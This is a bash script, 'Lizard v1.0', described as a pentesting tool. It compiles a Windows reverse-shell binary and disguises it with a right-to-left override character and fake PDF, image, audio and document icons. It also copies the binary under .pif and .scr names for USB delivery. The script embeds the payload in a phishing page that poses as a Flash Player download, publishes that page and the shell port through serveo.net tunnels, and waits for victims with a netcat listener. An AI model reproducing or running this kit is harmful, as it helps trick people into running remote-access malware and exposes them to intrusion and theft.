#!/bin/bash
# Lizard v1.0
# This tool was developed for pentesters and educational purposes only
# coded by: @linux_choice
# github.com/thelinuxchoice/lizard
# If you use any part from this code, giving me the credits. Read the Lincense!

trap 'printf "\n";stop' 2

coded_by() {

printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[1;31m        Extension Spoofer and Payload Generator\e[0m        \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]              v1.0 coded by @linux_choice              \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]            github.com/thelinuxchoice/lizard           \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf "\n"


}


banner2() {

printf "\n"

printf ' ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| \n'
printf ' |\e[1;31m///\e[0m |||||||\e[1;31m/////\e[0m |\e[1;31m/////////\e[0m ||\e[1;31m///////\e[0m ||\e[1;31m////////\e[0m ||\e[1;31m////////\e[0m || \n'
printf ' |\e[1;31m///\e[0m ||||||||\e[1;31m///\e[0m |||||||\e[1;31m///\e[0m ||\e[1;31m///\e[0m ||\e[1;31m///\e[0m |\e[1;31m///\e[0m ||\e[1;31m///\e[0m |\e[1;31m///\e[0m ||\e[1;31m///\e[0m | \n'
printf ' |\e[1;31m///\e[0m ||||||||\e[1;31m///\e[0m |||||\e[1;31m///\e[0m ||||\e[1;31m/////////\e[0m |\e[1;31m////////\e[0m ||\e[1;31m///\e[0m ||\e[1;31m///\e[0m | \n'
printf ' |\e[1;31m///\e[0m ||||||||\e[1;31m///\e[0m |||\e[1;31m///\e[0m ||||||\e[1;31m///\e[0m ||\e[1;31m///\e[0m |\e[1;31m///\e[0m ||\e[1;31m///\e[0m |\e[1;31m///\e[0m ||\e[1;31m///\e[0m | \n'
printf ' |\e[1;31m/////////\e[0m |\e[1;31m/////\e[0m |\e[1;31m/////////\e[0m |\e[1;31m///\e[0m ||\e[1;31m///\e[0m |\e[1;31m///\e[0m ||\e[1;31m///\e[0m |\e[1;31m////////\e[0m || \n'
printf ' ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| \n'

printf "\n"

}

banner0() {

printf "\n"


printf ' ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| \n'
printf ' |/// |||||||///// |///////// ||/////// ||//////// ||//////// || \n'
printf ' |/// ||||||||/// |||||||/// ||/// ||/// |/// ||/// |/// ||/// | \n'
printf ' |/// ||||||||/// |||||/// ||||///////// |//////// ||/// ||/// | \n'
printf ' |/// ||||||||/// |||/// ||||||/// ||/// |/// ||/// |/// ||/// | \n'
printf ' |///////// |///// |///////// |/// ||/// |/// ||/// |//////// || \n'
printf ' ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| \n'
printf "\n"



}


banner() {


printf "\n"


printf ' ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| \n'
printf ' |\e[1;93m///\e[0m |||||||\e[1;93m/////\e[0m |\e[1;93m/////////\e[0m ||\e[1;93m///////\e[0m ||\e[1;93m////////\e[0m ||\e[1;93m////////\e[0m || \n'
printf ' |\e[1;93m///\e[0m ||||||||\e[1;93m///\e[0m |||||||\e[1;93m///\e[0m ||\e[1;93m///\e[0m ||\e[1;93m///\e[0m |\e[1;93m///\e[0m ||\e[1;93m///\e[0m |\e[1;93m///\e[0m ||\e[1;93m///\e[0m | \n'
printf ' |\e[1;93m///\e[0m ||||||||\e[1;93m///\e[0m |||||\e[1;93m///\e[0m ||||\e[1;93m/////////\e[0m |\e[1;93m////////\e[0m ||\e[1;93m///\e[0m ||\e[1;93m///\e[0m | \n'
printf ' |\e[1;93m///\e[0m ||||||||\e[1;93m///\e[0m |||\e[1;93m///\e[0m ||||||\e[1;93m///\e[0m ||\e[1;93m///\e[0m |\e[1;93m///\e[0m ||\e[1;93m///\e[0m |\e[1;93m///\e[0m ||\e[1;93m///\e[0m | \n'
printf ' |\e[1;93m/////////\e[0m |\e[1;93m/////\e[0m |\e[1;93m/////////\e[0m |\e[1;93m///\e[0m ||\e[1;93m///\e[0m |\e[1;93m///\e[0m ||\e[1;93m///\e[0m |\e[1;93m////////\e[0m || \n'
printf ' ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| \n'
printf "\n"



}


stop() {


if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -9 ssh > /dev/null 2>&1
killall -9 ssh > /dev/null 2>&1
fi

if [[ -e index.html ]]; then
rm -rf index.html
fi

if [[ -e sendlink ]]; then
cat sendlink >> backup.serveo.tcp
rm -rf sendlink
fi


rm -rf *.exe > /dev/null 2>&1

exit 1
}

dependencies() {

command -v base64 > /dev/null 2>&1 || { echo >&2 "I require base64 but it's not installed. Install it. Aborting."; exit 1; }
command -v zip > /dev/null 2>&1 || { echo >&2 "I require zip but it's not installed. Install it. Aborting."; exit 1; }
command -v netcat > /dev/null 2>&1 || { echo >&2 "I require netcat but it's not installed. Install it. Aborting."; exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; } 
command -v i686-w64-mingw32-gcc > /dev/null 2>&1 || { echo >&2 "I require mingw-w64 but it's not installed. Install it: apt-get update && apt-get install mingw-w64"; 
exit 1; }

}


server() {


printf "\e[1;77m[\e[0m\e[1;93m::\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net -R '$default_port1':localhost:4444 2> /dev/null > sendlink ' &
printf "\e[1;77m[\e[0m\e[1;31m::\e[0m\e[1;77m]\e[0m\e[1;31m TCP Forwarding:\e[0m\e[1;77m serveo.net:%s/\e[0m\n" $default_port1
sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R '$default_port1':localhost:4444 2> /dev/null > sendlink ' &
printf "\e[1;77m[\e[0m\e[1;31m::\e[0m\e[1;77m]\e[0m\e[1;31m TCP Forwarding:\e[0m\e[1;77m serveo.net:%s/\e[0m\n" $default_port1
fi
printf "\e[1;77m[\e[0m\e[1;33m::\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 4
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf '\e[1;93m[\e[0m\e[1;77m::\e[0m\e[1;93m]\e[0m\e[1;91m Direct link:\e[0m\e[1;77m %s\n' $send_link
printf '\e[1;93m[\e[0m\e[1;77m::\e[0m\e[1;93m]\e[0m\e[1;77m Obfuscation URL use bitly.com (insert above link without https)\e[0m\n'


}


listener() {

printf "\e[1;77m[\e[0m\e[1;33m::\e[0m\e[1;77m] Listening connection:\e[0m\n"
nc -lvp 4444
}

payload() {

printf "\e[1;77m[\e[0m\e[1;33m::\e[0m\e[1;77m] Building malware binary\e[0m\n"

sed 's+serveo_port+'$default_port1'+g'  src/source.c > rs.c
ltro=$(echo -e '\u202e')

i686-w64-mingw32-windres icon.rc -O coff -o my.res
i686-w64-mingw32-gcc rs.c my.res -o "$payload_name""$ltro""$extension".exe 
rm -rf rs.c my.res icon.rc

if [[ -e "$payload_name""$ltro""$extension".exe ]]; then

if [[ ! -d "$payload_name"/ ]]; then
mkdir "$payload_name/"
fi
cp "$payload_name""$ltro""$extension".exe "$payload_name"/"$payload_name""$ltro""$extension".exe
cp "$payload_name""$ltro""$extension".exe "$payload_name"/"$payload_name""$ltro""$extension".pif
cp "$payload_name""$ltro""$extension".exe "$payload_name"/"$payload_name""$ltro""$extension".com
cp "$payload_name""$ltro""$extension".exe "$payload_name"/"$payload_name""$ltro""$extension".scr
cp "$payload_name""$ltro""$extension".exe "$payload_name"/"$ltro""$extension".scr
cp "$payload_name""$ltro""$extension".exe "$payload_name"/"$payload_name".scr
cp "$payload_name""$ltro""$extension".exe "$payload_name"/"$payload_name".pdf.pif
cp "$payload_name""$ltro""$extension".exe "$payload_name"/"$payload_name".png.pif
cp "$payload_name""$ltro""$extension".exe "$payload_name"/"$payload_name".jpg.pif
cp "$payload_name""$ltro""$extension".exe "$payload_name"/"$payload_name".mp3.pif
cp "$payload_name""$ltro""$extension".exe "$payload_name"/"$payload_name".mp4.pif
cp "$payload_name""$ltro""$extension".exe "$payload_name"/"$payload_name".doc.pif
cp "$payload_name""$ltro""$extension".exe "$payload_name"/"$payload_name".ppt.pif

zip "$payload_name"_all.zip "$payload_name"/* > /dev/null 2>&1

zip $payload_name.zip "$payload_name""$ltro""$extension".exe > /dev/null 2>&1
IFS=$'\n'
data_base64=$(base64 -w 0 $payload_name.zip) # > b64.txt)
temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"

printf "\e[1;77m[\e[0m\e[1;33m::\e[0m\e[1;77m] Converting binary to base64\e[0m\n" 
printf "\e[1;77m[\e[0m\e[1;33m::\e[0m\e[1;77m] Injecting Data URI code into index.html\e[0m\n"
sed 's+url_website+'$url'+g' src/template.html | sed 's+payload_name+'$payload_name'+g'  > src/temp
sed -f - src/temp > index.html << EOF
s/data_base64/${temp64}/g
EOF
rm -rf src/temp > /dev/null 2>&1

server

printf "\n"
printf '\e[1;93m[\e[0m\e[1;77m::\e[0m\e[1;93m]\e[0m\e[1;91m USB Stick Formats Saved\e[0m\e[1;77m (%s/):\e[0m\n' $payload_name
printf "\n"
count=0
for saved_file in $(ls "$payload_name"/); do
printf "\e[1;33m[\e[0m\e[1;77m%s\e[0m\e[1;33m] %s \e[0m\n" $count $saved_file
let count++
done
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf '\e[1;93m[\e[0m\e[1;77m::\e[0m\e[1;93m]\e[0m\e[1;91m Direct link:\e[0m\e[1;77m %s/%s_all.zip\n' $send_link $payload_name



printf "\n"


listener


else
printf "\e[1;93mError compiling\e[0m\n"
fi

}

config() {

default_spoof="PDF"
printf '\n'
printf ' \e[1;33m[\e[0m\e[1;31m01\e[0m\e[1;33m]\e[0m\e[1;77m PDF\e[0m\n '
printf '\e[1;33m[\e[0m\e[1;31m02\e[0m\e[1;33m]\e[0m\e[1;77m PNG\e[0m\n '
printf '\e[1;33m[\e[0m\e[1;31m03\e[0m\e[1;33m]\e[0m\e[1;77m JPG\e[0m\n '
printf '\e[1;33m[\e[0m\e[1;31m04\e[0m\e[1;33m]\e[0m\e[1;77m MP3\e[0m\n '
printf '\e[1;33m[\e[0m\e[1;31m05\e[0m\e[1;33m]\e[0m\e[1;77m MP4\e[0m\n '
printf '\e[1;33m[\e[0m\e[1;31m06\e[0m\e[1;33m]\e[0m\e[1;77m DOC\e[0m\n '
printf '\e[1;33m[\e[0m\e[1;31m07\e[0m\e[1;33m]\e[0m\e[1;77m PPT\e[0m\n '

printf '\n\e[1;33m[\e[0m\e[1;77m::\e[0m\e[1;33m] Spoof extension option: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_spoof
read spoof
spoof="${spoof:-${default_spoof}}"
if [[ $spoof -eq 1 ]] || [[ $spoof == "PDF" ]] || [[ $spoof == "pdf" ]] ; then

printf "id ICON \"%s\"" icons/pdf.ico  > icon.rc
extension="fdp"

elif [[ $spoof -eq 2 ]] || [[ $spoof == "PNG" ]] || [[ $spoof == "png" ]] ; then

printf "id ICON \"%s\"" icons/png.ico  > icon.rc
extension="gnp"

elif [[ $spoof -eq 3 ]] || [[ $spoof == "JPG" ]] || [[ $spoof == "jpg" ]] ; then

printf "id ICON \"%s\"" icons/jpg.ico  > icon.rc
extension="gpj"

elif [[ $spoof -eq 4 ]] || [[ $spoof == "MP3" ]] || [[ $spoof == "mp3" ]] ; then

printf "id ICON \"%s\"" icons/mp3.ico  > icon.rc
extension="3pm"

elif [[ $spoof -eq 5 ]] || [[ $spoof == "MP4" ]] || [[ $spoof == "mp4" ]] ; then

printf "id ICON \"%s\"" icons/mp4.ico  > icon.rc
extension="4pm"

elif [[ $spoof -eq 6 ]] || [[ $spoof == "DOC" ]] || [[ $spoof == "doc" ]] ; then

printf "id ICON \"%s\"" icons/doc.ico  > icon.rc
extension="cod"

elif [[ $spoof -eq 7 ]] || [[ $spoof == "PPT" ]] || [[ $spoof == "ppt" ]] ; then

printf "id ICON \"%s\"" icons/ppt.ico  > icon.rc
extension="tpp"


else
printf '\n\e[1;33m[\e[0m\e[1;77m!\e[0m\e[1;33m] Invalid option, try again \e[0m\n'
config
fi

}

start() {
default_port1=$(seq 1111 4444 | sort -R | head -n1)
default_payload_name="lizard"
default_url="https://get.adobe.com/flashplayer/download"
printf '\e[1;33m[\e[0m\e[1;77m::\e[0m\e[1;33m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_payload_name

read payload_name
payload_name="${payload_name:-${default_payload_name}}"

printf '\e[1;33m[\e[0m\e[1;77m::\e[0m\e[1;33m] Phishing URL (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_url
read url
url="${url:-${default_url}}"

printf '\e[1;33m[\e[0m\e[1;77m::\e[0m\e[1;33m] Serveo (Forwarding) Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_port1
read ddefault_port1
ddefault_port1="${ddefault_port1:-${default_port1}}"
default_choose_sub="Y"
default_subdomain="lizard$RANDOM"
printf '\e[1;33m[\e[0m\e[1;77m::\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m::\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi


payload

}
clear
banner0
sleep 1
clear

if (( $RANDOM % 2 )); then
banner
else
banner2
fi
coded_by
dependencies
config
start

